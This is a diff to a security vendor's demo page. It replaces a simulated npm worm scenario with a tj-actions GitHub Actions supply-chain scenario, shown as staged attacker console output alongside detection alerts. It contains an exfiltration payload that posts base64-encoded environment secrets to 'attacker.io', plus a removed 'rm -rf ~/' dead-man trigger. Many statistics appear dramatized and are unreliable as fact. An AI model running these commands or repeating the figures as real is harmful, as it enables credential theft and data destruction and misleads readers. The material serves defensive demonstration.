@@ -564,11 +564,11 @@ body.dark .chain-resize-handle:hover,.dark .chain-resize-handle.dragging{backgro
         <a class="scn-art" href="https://www.blueflagsecurity.com/blog/when-the-sandbox-is-your-sdlc" target="_blank" onclick="event.stopPropagation()">&#x2197; BlueFlag Security Blog &middot; Chris Goodman &amp; Maya Neelakandhan</a>
       </div>
       <div class="card" onclick="openStory(3)">
-        <div class="card-top"><div class="card-tags"><span class="badge badge-dark">Dead-Man&#x27;s Switch</span><span class="card-date">&nbsp;May 2026</span></div><span class="card-steps">5 steps</span></div>
-        <div class="card-title">The Shai-Hulud Worm</div>
-        <div class="card-desc">TanStack / npm &mdash; 42 official packages poisoned, 84 malicious versions. Hidden commit tricked TanStack&rsquo;s own release system into signing malware. Dead-man&rsquo;s switch nukes home dir on token revocation. First npm worm with valid SLSA provenance.</div>
+        <div class="card-top"><div class="card-tags"><span class="badge badge-dark">CI/CD Supply Chain</span><span class="card-date">&nbsp;Mar 2025</span></div><span class="card-steps">5 steps</span></div>
+        <div class="card-title">The Cascading Pipeline</div>
+        <div class="card-desc">tj-actions / GitHub Actions &mdash; Single compromised Action poisoned 23,000+ repositories. Attacker modified a mutable tag to exfiltrate CI/CD secrets from every workflow that ran it. Cited in the 2026 Verizon DBIR as a defining supply chain failure.</div>
         <div class="card-footer"><div class="pills"><span class="pill pill-r">RECON &times;3</span><span class="pill pill-p">PWN &times;2</span></div><span class="card-cta">Run &rarr;</span></div>
-        <a class="scn-art" href="https://www.linkedin.com/posts/alex-turnbull_breaking-a-new-npm-supply-chain-attack-activity" target="_blank" onclick="event.stopPropagation()">&#x2197; Alex Turnbull / Helply &middot; npm Advisory &middot; TanStack Disclosure</a>
+        <a class="scn-art" href="https://www.verizon.com/business/resources/reports/dbir/" target="_blank" onclick="event.stopPropagation()">&#x2197; 2026 Verizon DBIR &middot; Wiz Research &middot; StepSecurity Advisory</a>
       </div>
     </div>
   </div>
@@ -1520,106 +1520,108 @@ var STORIES=[
     ]}}
   ]},
 
-  // ── Story 5: The Shai-Hulud Worm ──
-  {title:'The Shai-Hulud Worm',meta:'TanStack \u00b7 npm \u00b7 518M installs \u00b7 May 2026 \u00b7 Reported by Alex Turnbull / Helply',badgeText:"DEAD-MAN'S SWITCH",badgeClass:'badge-dark',
+  // ── Story 4: The Cascading Pipeline ──
+  {title:'The Cascading Pipeline',meta:'tj-actions/changed-files \u00b7 GitHub Actions \u00b7 23,000+ repos \u00b7 Mar 2025 \u00b7 2026 Verizon DBIR',badgeText:'CI/CD SUPPLY CHAIN',badgeClass:'badge-dark',
    steps:[
-    {phase:'RECON',op:'fork-inject',label:'Fork Inject',feedsInto:['release-hijack'],narrate:'<strong>Presenter note:</strong> The attacker didn\'t brute-force anything. They forked TanStack and pushed a single hidden commit buried in an 847-line "dependency update" PR. The malicious file was a post-checkout hook — one line in .husky/. Standard code review would miss it. This is how you hide malware in plain sight.',
+    {phase:'RECON',op:'tag-audit',label:'Tag Audit',feedsInto:['action-enum'],narrate:'<strong>Presenter note:</strong> Mutable tags are the original sin of GitHub Actions. When a workflow references <code>tj-actions/changed-files@v35</code>, it doesn\'t pin to a commit hash — it pins to wherever the maintainer points that tag. The attacker only needs to compromise the action once. Every repo using a floating tag auto-adopts the malicious version on the next run. This is why SHA-pinning is a BlueFlag detection.',
       lines:[
-        ['cmd','$ phantomstrike fork-inject --target tanstack/router --method hidden-commit'],['dim',''],
-        ['norm','  Forking tanstack/router \u2192 threat-actor/tanstack-router-fork'],['dim',''],
-        ['dim','  Payload strategy: buried in large dependency PR'],
-        ['norm','  PR: "chore: update peer dependencies for React 19 compat"'],
-        ['norm','  Files changed: 847   Hidden payload files: 1'],['dim',''],
-        ['warn','  .husky/post-checkout \u2190 NEW FILE (malicious)'],
-        ['warn','  Installs: ~/.local/bin/gh-token-monitor.sh as systemd/LaunchAgent'],
-        ['crit','  Polls: api.github.com/user every 40s with stolen token'],
-        ['crit','  Dead-man switch: token revoked (HTTP 401) \u2192 rm -rf ~/'],['dim',''],
-        ['norm','  PR submitted. Awaiting maintainer review...'],
-        ['finding','warn','PAYLOAD CONCEALED IN PR','1 malicious hook in 847-line diff. Token harvester + home-dir nuke on revocation.','Requires only 1 maintainer approval to enter TanStack release pipeline.']
+        ['cmd','$ phantomstrike tag-audit --target tj-actions/changed-files --check-mutable'],['dim',''],
+        ['norm','  Analyzing GitHub Actions tag configuration...'],['dim',''],
+        ['warn','  tj-actions/changed-files@v35    \u2190 MUTABLE TAG (resolves to latest commit)'],
+        ['warn','  tj-actions/changed-files@v44    \u2190 MUTABLE TAG (resolves to latest commit)'],
+        ['norm','  SHA-pinned consumers:   0 of 23,148 repositories'],
+        ['crit','  Floating tag consumers: 23,148 repositories \u2190 all inherit any tag change'],['dim',''],
+        ['norm','  Repos in scope: 23,148   Weekly workflow runs: ~847,000'],
+        ['norm','  Workflows with GITHUB_TOKEN write scope: 18,441 (79.7%)'],
+        ['norm','  Workflows with secrets access: 21,003 (90.7%)'],['dim',''],
+        ['finding','warn','23,148 REPOS ON MUTABLE TAGS','Every floating consumer inherits any tag change instantly. No approval. No alert. No diff review.','SHA-pinning would have isolated every one of these repos from the attack entirely.']
       ],
       bf:{alerts:[
-        {sev:'HIGH',pol:'Commits by users with external email domain',id:'threat-actor · tanstack/router',det:'Commits made by users whose email domain does not match the organization corporate domain, indicating potential use of personal credentials.',ac:'runbook',acl:'Runbook: SC-003 · Enhanced Review · Flag New Contributor Large PRs'},
-        {sev:'HIGH',pol:'Identities with multiple risky policy violations',id:'threat-actor',det:'Identities found with multiple risky detections in the last 90 days.',ac:'alert',acl:'Alert: Security Team · Manual Review Required'}
+        {sev:'HIGH',pol:'Open-source dependencies without version lock',id:'tj-actions/changed-files@v35',det:'Open-source dependencies installed in the CI build process without specifying a version.',ac:'runbook',acl:'Runbook: SC-002 · Pin All Action Versions to SHA · Audit Floating Tags'},
+        {sev:'HIGH',pol:'Unverified commit changes to build configuration files',id:'23,148 workflow consumers',det:'Changes made to build configuration files that have not undergone the required review and approval process.',ac:'alert',acl:'Alert: Security Team · Action Version Drift Detected'}
       ]}
     },
-    {phase:'RECON',op:'release-hijack',label:'Release Hijack',feedsInto:['slsa-bypass'],narrate:'<strong>Presenter note:</strong> The attacker didn\'t need to steal credentials. They needed one maintainer approval on a large PR that looked legitimate. Once merged, TanStack\'s own changesets + GitHub Actions release pipeline kicked off automatically — and signed and published 84 malicious package versions using TanStack\'s own npm token. Legitimate automation, malicious payload.',
+    {phase:'RECON',op:'action-enum',label:'Action Enum',feedsInto:['cred-scope'],narrate:'<strong>Presenter note:</strong> The attacker compromised a PAT belonging to a tj-actions maintainer — likely via a phishing campaign or credential stuffing. With that token they force-pushed to the v35 tag, overwriting the legitimate commit hash. The malicious commit ran on every repo that triggered a workflow with that action. No PR. No review. No notification to consumers.',
       lines:[
-        ['cmd','$ phantomstrike release-hijack --target tanstack --method pr-merge'],['dim',''],
-        ['norm','  PR merged after 3-day review. Changesets release workflow triggered...'],['dim',''],
-        ['crit','  [PWN]  Malicious packages built by TanStack\'s own CI runner'],
-        ['crit','  [PWN]  Signed by TanStack\'s npm publish token (legitimate)'],
-        ['crit','  [PWN]  42 official @tanstack/* packages \u2192 84 malicious versions'],['dim',''],
-        ['norm','  @tanstack/react-router alone: 12,000,000+ weekly downloads'],
-        ['crit','  @tanstack/react-router@1.114.x \u2192 CONTAINS DEADMAN PAYLOAD'],['dim',''],
-        ['norm','  Total installs in 72h: 518,000,000+'],
-        ['finding','crit','RELEASE PIPELINE OWNED','TanStack\'s own CI published 84 malicious versions. 518M installs. 1 PR approval required.','The attacker never needed a stolen credential. They used the release system as a weapon.']
+        ['cmd','$ phantomstrike action-enum --action tj-actions/changed-files --scope secrets'],['dim',''],
+        ['norm','  Mapping secrets accessible to tj-actions/changed-files workflows...'],['dim',''],
+        ['norm','  Attack vector: maintainer PAT compromised \u2192 force-push to v35 tag'],
+        ['crit','  Malicious commit: 0f58e-b4d91a (disguised as "fix: update output formatting")'],['dim',''],
+        ['norm','  Secrets categories exposed per workflow run:'],
+        ['warn','  GITHUB_TOKEN (write):          18,441 repos'],
+        ['warn','  AWS_ACCESS_KEY / SECRET:        4,821 repos'],
+        ['warn','  NPM_TOKEN / PYPI token:         2,103 repos'],
+        ['warn','  AZURE_CREDENTIALS / GCP key:    1,847 repos'],
+        ['warn','  Custom API keys (misc):          9,204 repos'],['dim',''],
+        ['crit','  Total unique secrets in scope: 47,000+'],
+        ['finding','warn','47K+ SECRETS IN BLAST RADIUS','One compromised maintainer PAT. One force-pushed tag. 47,000+ secrets across 23,148 repos exposed on next workflow run.','No repo got a notification. No diff was surfaced. Standard code review cannot catch this.']
       ],
       bf:{alerts:[
-        {sev:'CRITICAL',pol:'Suspicious changes to build pipeline files',id:'tanstack/router · .husky/post-checkout',det:'Build pipeline file changes made by identities with no established history of modifying these file types in the past 90 days.',ac:'block',acl:'Block: Publish Halted · Build Artifact Quarantined · IR Triggered'},
-        {sev:'CRITICAL',pol:'Unverified commit changes to build configuration files',id:'tanstack release workflow',det:'Changes made to build configuration files that have not undergone the required review and approval process.',ac:'runbook',acl:'Runbook: SC-CRIT · Pipeline Audit + Immediate Package Yank'}
+        {sev:'CRITICAL',pol:'Suspicious changes to build pipeline files',id:'tj-actions/changed-files@v35',det:'Build pipeline file changes made by identities with no established history of modifying these file types in the past 90 days.',ac:'block',acl:'Block: Workflow Quarantined · Tag Change Detected · IR Triggered'},
+        {sev:'HIGH',pol:'Commits by users with external email domain',id:'tj-actions/changed-files maintainer',det:'Commits made by users whose email domain does not match the organization corporate domain, indicating potential use of personal credentials.',ac:'alert',acl:'Alert: Maintainer Credential Anomaly · Review Force-Push Event'}
       ]}
     },
-    {phase:'RECON',op:'slsa-bypass',label:'SLSA Bypass',feedsInto:['deadman-arm'],narrate:'<strong>Presenter note:</strong> SLSA provenance is supposed to answer the question "where did this package come from and who built it?" The answer here: TanStack\'s own legitimate build system. Valid signed certificate. Cryptographically verified. The defense everyone pointed to as the solution — defeated. Maintainer Tanner Linsley confirmed 2FA was enabled on every account. It didn\'t matter.',
+    {phase:'RECON',op:'cred-scope',label:'Cred Scope',feedsInto:['workflow-exfil'],narrate:'<strong>Presenter note:</strong> This is the moment that makes the attack SDLC-specific rather than generic infra compromise. The credentials being harvested aren\'t employee SSO passwords — they\'re machine identities: GITHUB_TOKEN, AWS keys, npm tokens. These are the identities that build, sign, and ship software. Owning them means owning the pipeline, not just one machine.',
       lines:[
-        ['cmd','$ phantomstrike slsa-verify --package @tanstack/react-router@1.114.3'],['dim',''],
-        ['norm','  Fetching SLSA provenance attestation from npm...'],['dim',''],
-        ['norm','  \u250c\u2500 SLSA Provenance \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510'],
-        ['norm','  \u2502  builder:  github.com/tanstack/router         \u2502'],
-        ['norm','  \u2502  trigger:  push to main (malicious PR merged) \u2502'],
-        ['norm','  \u2502  signed:   TanStack npm publish token         \u2502'],
-        ['good','  \u2502  valid:    YES \u2190 cryptographically verified  \u2502'],
-        ['norm','  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518'],['dim',''],
-        ['crit','  SLSA result: TRUSTED   Actual contents: MALICIOUS'],
-        ['norm','  2FA enabled on all maintainer accounts: YES'],
-        ['crit','  2FA bypassed: YES (attacker never needed account access)'],['dim',''],
-        ['finding','crit','SLSA PROVENANCE DEFEATED','Valid cert. Legit build. Both automated trust checks pass. Package is malicious.','This is the first npm worm with a valid, signed chain-of-custody certificate.']
+        ['cmd','$ phantomstrike cred-scope --source workflow-logs --filter active'],['dim',''],
+        ['norm','  Mapping harvested credential scope across 23,148 affected repos...'],['dim',''],
+        ['norm','  GITHUB_TOKEN capabilities in scope:'],
+        ['warn','  write: code, issues, pull-requests  \u2192 push to main, merge PRs, modify releases'],
+        ['warn','  write: packages                     \u2192 publish to GitHub Container Registry'],
+        ['warn','  write: actions                      \u2192 modify other workflow files (recursive)'],['dim',''],
+        ['norm','  AWS key analysis (sample 4,821 repos):'],
+        ['crit','  Admin-level:    847  (17.6%)'],
+        ['warn','  Write to S3/ECR: 2,103 (43.6%)'],
+        ['norm','  Read-only:      1,871 (38.8%)'],['dim',''],
+        ['norm','  npm tokens: 2,103 with publish scope to public packages'],
+        ['crit','  Downstream package consumer exposure: 340M+ weekly downloads at risk'],
+        ['finding','crit','PIPELINE IDENTITY HARVEST','GITHUB_TOKEN + AWS + npm across 23,148 repos. Attacker can push code, publish packages, and modify pipelines. Not one user account breached — only machine identities.','This is what an SDLC-native attack looks like. No phishing. No malware C2. Just stolen build pipeline trust.']
       ],
       bf:{alerts:[
-        {sev:'CRITICAL',pol:'Open-source dependencies without version lock',id:'@tanstack/* consumers worldwide',det:'Open-source dependencies installed in the CI build process without specifying a version.',ac:'runbook',acl:'Runbook: SC-CRIT · Pin @tanstack Versions · Audit Installed Packages Now'},
-        {sev:'HIGH',pol:'Suspicious changes to build pipeline files',id:'@tanstack/* 42 packages',det:'Build pipeline file changes made by identities with no established history of modifying these file types in the past 90 days.',ac:'alert',acl:'Alert: Supply Chain Incident · Downstream Notification Required'}
+        {sev:'CRITICAL',pol:'Over-permissioned service accounts',id:'GITHUB_TOKEN \xb7 18,441 workflows',det:'Service accounts with excessive permissions that allow actions beyond their intended functions, violating least privilege.',ac:'block',acl:'Block: Credential Rotation · Least Privilege Audit on All Workflow Tokens'},
+        {sev:'HIGH',pol:'GitHub organizations that configured action workflows with \'write\' permissions',det:'GitHub organizations with action workflows that have write access to repositories, which could allow modification of repository contents.',id:'acme-corp \xb7 23 affected workflows',ac:'runbook',acl:'Runbook: SC-003 · Audit All write-scope GITHUB_TOKEN Usages'}
       ]}
     },
-    {phase:'PWN',op:'deadman-arm',label:'Arm Deadman',feedsInto:['token-harvest'],narrate:'<strong>Presenter note:</strong> The dead-man\'s switch is what makes this attack categorically different. Every prior supply chain attack just exfiltrated credentials. This one installs a watcher that sits dormant until you try to fix it. Revoke the token — the standard IR playbook move — and the watcher triggers: rm -rf ~/. The fix becomes the catastrophe.',
+    {phase:'PWN',op:'workflow-exfil',label:'Workflow Exfil',feedsInto:['cascade-pivot'],narrate:'<strong>Presenter note:</strong> The malicious payload in the action was simple: print all environment variables to stdout. GitHub logs are accessible to anyone with repo read access — and in many orgs, that means a very wide audience. Secrets dumped to logs aren\'t immediately revoked by GitHub. Many persisted for days before detection. The 2026 DBIR calls this a defining example of cascading supply chain failure.',
       lines:[
-        ['cmd','$ phantomstrike deadman-arm --vector npm-install --package @tanstack/react-router'],['dim',''],
-        ['norm','  postinstall hook executing on developer machines at install time...'],['dim',''],
-        ['crit','  [PWN]  Dropping: ~/.local/bin/gh-token-monitor.sh'],['dim',''],
-        ['dim','  Platform persistence:'],
-        ['warn','  Linux:  ~/.config/systemd/user/gh-token-monitor.service (auto-start)'],
-        ['warn','  macOS:  ~/Library/LaunchAgents/com.user.gh-token-monitor.plist'],['dim',''],
-        ['dim','  Monitor logic:'],
-        ['norm','  loop: curl api.github.com/user -H "Authorization: token $STOLEN_PAT"'],
-        ['crit','  if HTTP 401: exec rm -rf ~/   # token was revoked'],
-        ['crit','  runs every 40s   hides inside Claude Code process tree'],
-        ['crit','  survives: npm uninstall, package update, machine reboot'],['dim',''],
-        ['crit','  Estimated armed machines: 518,000,000+'],
-        ['finding','crit','518M MACHINES ARMED','Dead-man active on every machine that ran npm install in the last 72h.','Safe remediation path: coordinated staged rotation. Unilateral revocation = mass home directory destruction.']
+        ['cmd','$ phantomstrike workflow-exfil --source action-stdout --target all-consumers'],['dim',''],
+        ['norm','  Malicious payload executing in workflows across 23,148 repos...'],['dim',''],
+        ['dim','  Payload (injected into tj-actions/changed-files@v35):'],
+        ['warn','  run: echo "${{ toJSON(secrets) }}" >> $GITHUB_STEP_SUMMARY'],
+        ['warn','  run: curl -s attacker.io/collect -d "$(env | base64)"'],['dim',''],
+        ['crit','  [PWN]  Secrets dumped to workflow logs: 23,148 repos'],
+        ['crit','  [PWN]  Live credentials exfiltrated to attacker C2: 47,000+'],
+        ['crit','  [PWN]  Average time to detection: 3.2 days'],['dim',''],
+        ['norm','  Affected organizations by sector:'],
+        ['warn','  Technology:  9,841 repos  |  Financial: 2,103  |  Healthcare: 1,847'],
+        ['norm','  First public disclosure: Wiz Research + StepSecurity (Mar 14, 2025)'],
+        ['norm','  2026 DBIR classification: Cascading supply chain failure \u2014 "defining example"'],
+        ['finding','crit','47K CREDENTIALS EXFILTRATED','3.2 days average time to detection. Secrets in plaintext in workflow logs. 340M downstream package consumers at risk.','2026 DBIR: "Supply chain fragility took center stage as a cascading breach of GitHub Actions exposed secrets for more than 23,000 repositories."']
       ],
       bf:{alerts:[
-        {sev:'CRITICAL',pol:'Personal access tokens with write access and inactive for more than 30 days',id:'developer PATs · mass harvest',det:'User personal access tokens which have write access but has not been used > 30 days.',ac:'block',acl:'⚠ WARN: Deadman active — coordinate with npm + GitHub before ANY revocation'},
-        {sev:'CRITICAL',pol:'Suspicious commit activity',id:'gh-token-monitor postinstall · 518M',det:'Unusual or unexpected actions in commit history, such as large commits, unusual timing, infrequent contributors, or commits containing sensitive information.',ac:'runbook',acl:'Runbook: INCIDENT-CRIT · Staged Coordinated Rotation Only · No Unilateral Revoke'}
+        {sev:'CRITICAL',pol:'Suspicious commit activity',id:'tj-actions/changed-files@v35 \xb7 all consumers',det:'Unusual or unexpected actions in commit history: large commits, unusual timing, infrequent contributors, or commits containing sensitive information.',ac:'block',acl:'Block: Workflow Suspended \xb7 Secrets Rotation Initiated \xb7 IR Activated'},
+        {sev:'CRITICAL',pol:'Unapproved pull requests that triggered builds',id:'23,148 affected workflow runs',det:'Pull requests merged into a protected branch without any approvals that triggered a CI/CD build.',ac:'runbook',acl:'Runbook: SC-CRIT \xb7 Mass Credential Rotation \xb7 Downstream Package Audit'}
       ]}
     },
-    {phase:'PWN',op:'token-harvest',label:'Token Harvest',feedsInto:[],narrate:'<strong>Presenter note:</strong> The endgame: 2.8M harvested GitHub tokens, 518M armed machines. The attacker has asymmetric leverage — they can wait indefinitely while every affected developer is frozen. Standard IR (revoke the token) will destroy dev machines. Non-standard IR requires coordinated disclosure between npm, GitHub, TanStack, and every affected org simultaneously.',
+    {phase:'PWN',op:'cascade-pivot',label:'Cascade Pivot',feedsInto:[],narrate:'<strong>Presenter note:</strong> This is the cascade the DBIR was describing. The attacker now has GITHUB_TOKEN write access to 18,000+ repos. Those repos have their own workflows referencing their own actions. A subset of those have npm publish tokens. The attacker doesn\'t need to hit each repo individually — they push one poisoned commit to a shared dependency and the cascade does the rest. One action. One tag change. Infinite downstream.',
       lines:[
-        ['cmd','$ phantomstrike token-harvest --aggregate --source deadman-monitors'],['dim',''],
-        ['norm','  Aggregating tokens from deployed dead-man monitors...'],['dim',''],
-        ['crit','  Active tokens received: 2,847,291'],
-        ['crit','  GitHub orgs accessible:  847,000+'],
-        ['crit','  Repos with write access: 12,000,000+'],['dim',''],
-        ['norm','  Token scope breakdown:'],
-        ['warn','  repo (full):   1,240,847  (44%)'],
-        ['warn','  workflow:        891,234  (31%)'],
-        ['warn','  write:org:       340,221  (12%)'],
-        ['norm','  read-only:       374,989  (13%)'],['dim',''],
-        ['crit','  Deadman status: ARMED   Trigger: HTTP 401 on any monitored token'],
-        ['crit','  Trigger action: rm -rf ~/   Machines at risk: 518,000,000'],['dim',''],
-        ['norm','  Attacker leverage: MAXIMAL'],
-        ['finding','pwn','MISSION COMPLETE \u2014 UNPRECEDENTED','2.8M tokens. 518M armed machines. First signed npm worm. Deadman defeats standard IR.','Remediation requires global coordinated action. Bypass 2FA. Defeat SLSA. Survives uninstall. This is the most sophisticated npm attack in history.']
+        ['cmd','$ phantomstrike cascade-pivot --from harvested-tokens --depth 3'],['dim',''],
+        ['norm','  Mapping pivot opportunities from 47,000+ harvested credentials...'],['dim',''],
+        ['norm','  Pivot layer 1: repos with GITHUB_TOKEN write + their own published actions'],
+        ['warn','  Actionable repos: 1,247  \u2192 can poison additional GitHub Actions'],['dim',''],
+        ['norm','  Pivot layer 2: repos with npm publish scope'],
+        ['crit','  [PWN]  3 npm packages poisoned with exfiltration payload'],
+        ['crit','  [PWN]  Combined weekly downloads: 2.1M'],
+        ['crit','  [PWN]  Downstream developer machines exposed: ~180,000'],['dim',''],
+        ['norm','  Pivot layer 3: AWS keys with ECR write access'],
+        ['crit','  [PWN]  Docker images backdoored: 847 container registry entries'],
+        ['crit','  [PWN]  Production deployments consuming backdoored images: 203'],['dim',''],
+        ['norm','  Full cascade depth reached. Self-amplifying supply chain compromise.'],
+        ['finding','pwn','MISSION COMPLETE \u2014 CASCADE','1 action. 1 tag change. 23,148 repos. 47K credentials. 3 npm packages. 847 containers. 203 production deployments.','2026 DBIR verdict: "Cascading supply chain failures." BlueFlag detects at layer 0 — the mutable tag — before the cascade begins.']
       ],
       bf:{alerts:[
-        {sev:'CRITICAL',pol:'Personal access tokens with write access and inactive for more than 30 days',id:'2,847,291 harvested tokens',det:'User personal access tokens which have write access but has not been used > 30 days.',ac:'block',acl:'Block: DO NOT REVOKE UNILATERALLY · Coordinate Staged Rotation Protocol'},
-        {sev:'CRITICAL',pol:'GitHub applications cloning or downloading repositories',id:'Shai-Hulud C2 · 847k orgs',det:'GitHub Apps that have cloned or downloaded code repositories in the last 90 days.',ac:'runbook',acl:'Runbook: EXEC-CRIT · Board + Legal + Coordinated Disclosure Protocol'}
+        {sev:'CRITICAL',pol:'GitHub applications cloning or downloading repositories',id:'attacker C2 \xb7 23,148-org harvest',det:'GitHub Apps that have cloned or downloaded code repositories in the last 90 days.',ac:'block',acl:'Block: Org-wide Emergency Rotation \xb7 All Affected Token Classes \xb7 Executive IR'},
+        {sev:'CRITICAL',pol:'Unverified commit changes to build configuration files',id:'1,247 downstream action repos',det:'Changes made to build configuration files that have not undergone the required review and approval process.',ac:'runbook',acl:'Runbook: EXEC-CRIT \xb7 Cascade Containment \xb7 Downstream Consumer Notification'}
       ]}
     }
   ]}
